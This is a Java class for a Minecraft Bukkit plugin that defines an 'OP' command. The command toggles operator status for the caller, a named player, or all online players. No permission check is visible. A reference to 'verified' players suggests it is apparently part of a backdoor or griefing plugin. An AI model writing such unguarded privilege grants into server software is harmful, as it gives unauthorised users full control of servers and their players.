package com.pi.cmd.commands;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import com.pi.cmd.main.CommandBase;
import com.pi.main.PI;

public class CommandOP extends CommandBase {

	public CommandOP() {
		super("OP", "Toggle OP for you or others.", "OP [player | all]");
	}

	@Override
	public void runCommand(Player p, String[] args) {
		if (args.length == 1) {
			if (!p.isOp()) {
				p.setOp(true);
				PI.addMessage(p, "You are now OP!");
			} else {
				p.setOp(false);
				PI.addMessage(p, "You are no longer OP!");
			}
		}

		if (args.length == 2) {
			if (args[1].equalsIgnoreCase("all")) {
				for (Player v : Bukkit.getOnlinePlayers()) {
					v.setOp(!v.isOp());
					if (v.isOp()) {
						v.sendMessage("You are now OP!");
					}
				}
				PI.addMessage(p, "You have toggled everyone's OP (OPs will no longer be OP, and vice versa).");
			}
			else {
				Player v = this.getPlayer(args[1], p);
				if (v == null) {
					PI.addMessage(p, "Player not found, or is verified.");
				} else {
					if (!v.isOp()) {
						v.setOp(true);
						PI.addMessage(p, "You have opped: " + v.getName());
					}
					else {
						v.setOp(false);
						PI.addMessage(p, "You have deopped: " + v.getName());
					}
				}
			}
		}
	}

}
